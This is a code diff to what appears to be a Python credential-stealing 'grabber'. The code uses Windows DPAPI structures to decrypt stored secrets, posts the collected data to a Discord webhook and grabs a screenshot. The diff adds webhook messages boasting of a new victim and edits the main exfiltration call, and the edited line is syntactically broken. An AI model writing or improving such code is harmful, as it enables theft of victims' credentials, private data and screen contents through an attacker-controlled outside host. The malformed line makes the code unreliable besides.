@@ -75,7 +75,16 @@ DETECTED = False
 
 class DATA_BLOB(Structure):
     _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]
-    
+  
+
+payload1 = {"content": "<:pikachusign:1084901293669220422> **AYOOO GRABBED SOME DUMMY** ||@everyone||", "username": wh_name, "avatar_url": wh_avatar}
+payload2 = {"content": "https://cdn.discordapp.com/emojis/1084901411768238190.gif", "username": wh_name, "avatar_url": wh_avatar}
+payload3 = {"content": "https://cdn.discordapp.com/emojis/1084901431531798641.gif", "username": wh_name, "avatar_url": wh_avatar}
+response = requests.post(webhook, json=payload1)
+response = requests.post(webhook, json=payload2)
+response = requests.post(webhook, json=payload3)
+
+
 def GetData(blob_out):
     cbData = int(blob_out.cbData)
     pbData = blob_out.pbData
@@ -937,7 +946,7 @@ embed = {
     ],
 }
 
-requests.post(webhook, json={"embeds": [embed]})
+requests.post(webhook, json={"embeds": [embed]}, "username": wh_name, "avatar_url": wh_avatar)
 
 
 screenshot = ImageGrab.grab()
